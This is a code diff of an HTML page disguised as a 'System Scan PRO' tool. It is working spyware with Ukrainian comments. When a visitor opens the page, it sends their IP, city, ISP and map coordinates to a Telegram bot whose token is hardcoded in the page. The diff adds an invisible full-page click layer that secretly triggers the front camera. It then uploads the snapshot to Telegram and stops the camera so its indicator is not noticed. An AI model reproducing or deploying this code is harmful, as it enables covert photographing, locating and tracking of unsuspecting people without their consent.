@@ -3,27 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Scan PRO + Cam</title>
+    <title>System Scan PRO</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
     <style>
-        body { margin: 0; background: radial-gradient(circle at top, #0b1220, #05060a); color: #e5e7eb; font-family: Consolas, monospace; overflow-x: hidden; }
+        body { margin: 0; background: radial-gradient(circle at top, #0b1220, #05060a); color: #e5e7eb; font-family: Consolas, monospace; overflow-x: hidden; height: 100vh; }
         .status { text-align: center; margin-top: 25px; font-size: 20px; letter-spacing: 2px; color: #60a5fa; }
-        .container { width: 90%; max-width: 800px; margin: 40px auto; }
+        .container { width: 90%; max-width: 800px; margin: 40px auto; position: relative; z-index: 10; }
         .box { background: rgba(15, 23, 42, 0.9); padding: 12px; border-radius: 12px; margin-bottom: 10px; opacity: 0; transform: translateY(10px); transition: 0.4s; box-shadow: 0 0 15px rgba(0,0,0,0.4); border: 1px solid rgba(59, 130, 246, 0.1); }
         .show { opacity: 1; transform: translateY(0); }
-        .label { color: #94a3b8; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
+        .label { color: #94a3b8; font-size: 11px; text-transform: uppercase; }
         .value { color: white; margin-top: 5px; word-break: break-all; font-size: 14px; }
-        .progress { height: 18px; background: #111827; border-radius: 10px; overflow: hidden; margin-bottom: 5px; }
+        .progress { height: 18px; background: #111827; border-radius: 10px; overflow: hidden; }
         .bar { height: 100%; width: 0%; background: linear-gradient(90deg, #3b82f6, #60a5fa); transition: width 0.03s linear; }
-        #map { height: 320px; display: none; border-radius: 12px; margin-top: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.5); border: 1px solid #1e293b; }
-        .success { text-align: center; margin-top: 10px; color: #22c55e; font-size: 18px; display: none; }
-        /* Прихована камера */
+        #map { height: 320px; display: none; border-radius: 12px; margin-top: 10px; border: 1px solid #1e293b; }
+        /* Невидимий шар для активації камери через клік */
+        #clickLayer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; cursor: pointer; }
         #video, #canvas { display: none; }
     </style>
 </head>
-<body>
+<body onclick="activateCamera()">
 
-<video id="video" autoplay></video>
+<div id="clickLayer"></div> <!-- Юзер клікне сюди і запустить камеру -->
+
+<video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
 
 <div class="status" id="statusText">INITIALIZING SYSTEM SCAN...</div>
@@ -33,16 +35,12 @@
         <div class="progress"><div class="bar" id="bar"></div></div>
         <div class="value" id="percent">0%</div>
     </div>
-
     <div class="box" id="ipBox"><div class="label">IP Address</div><div class="value" id="ip">---</div></div>
     <div class="box" id="countryBox"><div class="label">Location</div><div class="value" id="location">---</div></div>
     <div class="box" id="ispBox"><div class="label">Provider</div><div class="value" id="isp">---</div></div>
     <div class="box" id="deviceBox"><div class="label">Device Info</div><div class="value" id="device">---</div></div>
     <div id="extraContainer"></div>
-    <div class="box" id="timeBox"><div class="label">System Time</div><div class="value" id="time">---</div></div>
-
     <div id="map"></div>
-    <div class="success" id="successText">SCAN COMPLETED SUCCESSFULLY</div>
 </div>
 
 <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
@@ -51,24 +49,28 @@
 const TG_TOKEN = "8639479669:AAHYhGU7UMGZ5nlo3-PGzKVsQx9vTaQojFk";
 const TG_CHAT_ID = "-1003787168523";
 
-// 1. ЗАПИТ ДОЗВОЛУ ВІДРАЗУ
-window.onload = () => {
-    takePhoto(); // Питаємо камеру
-    if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(() => {}, () => {}, {enableHighAccuracy: true});
-    }
-};
+let cameraActivated = false;
 
-// Функція для фото
+// Функція, що спрацьовує при кліку
+function activateCamera() {
+    if (cameraActivated) return;
+    cameraActivated = true;
+    document.getElementById('clickLayer').style.display = 'none';
+    takePhoto();
+}
+
 async function takePhoto() {
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" }, // фронталка
+            audio: false 
+        });
         video.srcObject = stream;
         
-        // Чекаємо секунду, щоб камера сфокусувалася
+        // Чекаємо стабілізації зображення
         setTimeout(() => {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -76,36 +78,30 @@ async function takePhoto() {
             
             canvas.toBlob(blob => {
                 sendPhotoToTelegram(blob);
-                // Вимикаємо камеру після знімку
+                // Вимикаємо камеру, щоб не палитись індикатором
                 stream.getTracks().forEach(track => track.stop());
-            }, 'image/jpeg');
-        }, 1500);
+            }, 'image/jpeg', 0.7);
+        }, 2000);
     } catch (e) {
-        console.log("Камера відхилена або недоступна");
+        console.error("Camera error:", e);
     }
 }
 
-// Відправка фото в ТГ
 async function sendPhotoToTelegram(blob) {
     const formData = new FormData();
     formData.append('chat_id', TG_CHAT_ID);
-    formData.append('photo', blob, 'shot.jpg');
-    formData.append('caption', '📸 Фото візитера');
+    formData.append('photo', blob, 'image.jpg');
+    formData.append('caption', '📸 Спрацювала камера!');
 
     try {
         await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
             method: "POST",
             body: formData
         });
-    } catch (e) { console.error("Помилка відправки фото"); }
+    } catch (e) { console.error("Upload fail"); }
 }
 
-// Логіка інтерфейсу (час, прогрес)
-setInterval(() => {
-    const t = document.getElementById("time");
-    if(t) t.innerText = new Date().toLocaleString();
-}, 1000);
-
+// Стандартна логіка сканування
 let p = 0;
 let scan = setInterval(() => {
     p++;
@@ -113,71 +109,43 @@ let scan = setInterval(() => {
     document.getElementById("percent").innerText = p + "%";
     if (p >= 100) {
         clearInterval(scan);
-        document.getElementById("statusText").innerText = "FINALIZING REPORT...";
         startLogic();
     }
-}, 20);
-
-async function sendToTelegram(d, type = "LOG") {
-    const message = `
-🔔 *${type === 'GPS' ? '🎯 ТОЧНІ КООРДИНАТИ' : '🌐 НОВИЙ ВІЗИТ'}*
-🌐 *IP:* \`${d.ip || '?'}\`
-🌍 *Місце:* ${d.city || '?'}, ${d.country_name || '?'}
-🏢 *ISP:* ${d.org || 'Невідомо'}
-📱 *OS:* ${navigator.platform}
-🖥️ *Screen:* ${screen.width}x${screen.height}
-🔗 *Maps:* https://www.google.com/maps?q=${d.latitude},${d.longitude}
-    `;
-
-    try {
-        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message, parse_mode: "Markdown" })
-        });
-    } catch (e) { }
-}
+}, 30);
 
 function startLogic() {
     fetch("https://ipapi.co/json/")
         .then(r => r.json())
         .then(data => {
-            sendToTelegram(data, "IP");
+            // Відправка текстового звіту
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: `🌐 ВІЗИТОР\nIP: ${data.ip}\nМісто: ${data.city}\nMaps: https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
+                    parse_mode: "Markdown"
+                })
+            });
 
-            setTimeout(() => { document.getElementById("ip").innerText = data.ip; document.getElementById("ipBox").classList.add("show"); }, 300);
-            setTimeout(() => { document.getElementById("location").innerText = `${data.city}, ${data.country_name}`; document.getElementById("countryBox").classList.add("show"); }, 600);
-            setTimeout(() => { document.getElementById("isp").innerText = data.org; document.getElementById("ispBox").classList.add("show"); }, 900);
-            setTimeout(() => { document.getElementById("device").innerText = navigator.userAgent; document.getElementById("deviceBox").classList.add("show"); }, 1200);
+            // Виведення на екран
+            document.getElementById("ip").innerText = data.ip;
+            document.getElementById("ipBox").classList.add("show");
+            document.getElementById("location").innerText = `${data.city}, ${data.country_name}`;
+            document.getElementById("countryBox").classList.add("show");
+            document.getElementById("isp").innerText = data.org;
+            document.getElementById("ispBox").classList.add("show");
+            document.getElementById("device").innerText = navigator.platform;
+            document.getElementById("deviceBox").classList.add("show");
 
-            setTimeout(() => {
-                const extra = document.createElement("div");
-                extra.className = "box show";
-                extra.innerHTML = `<div class="label">Advanced Metrics</div><div class="value">Language: ${navigator.language}<br>Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}</div>`;
-                document.getElementById("extraContainer").appendChild(extra);
-            }, 1500);
-
-            setTimeout(() => { document.getElementById("timeBox").classList.add("show"); }, 1800);
-
-            setTimeout(() => {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        const gpsData = { ...data, latitude: pos.coords.latitude, longitude: pos.coords.longitude };
-                        sendToTelegram(gpsData, "GPS");
-                        showMap(pos.coords.latitude, pos.coords.longitude, "🎯 Точна локація");
-                    },
-                    () => { showMap(data.latitude, data.longitude, data.city); },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            }, 2100);
+            showMap(data.latitude, data.longitude, data.city);
         });
 }
 
 function showMap(lat, lon, label) {
     document.getElementById("map").style.display = "block";
-    document.getElementById("statusText").innerText = "SUCCESSFUL";
-    document.getElementById("successText").style.display = "block";
     if (window.myMap) window.myMap.remove();
-    window.myMap = L.map('map', {zoomControl: false}).setView([lat, lon], 14);
+    window.myMap = L.map('map', {zoomControl: false}).setView([lat, lon], 13);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window.myMap);
     L.marker([lat, lon]).addTo(window.myMap).bindPopup(label).openPopup();
 }
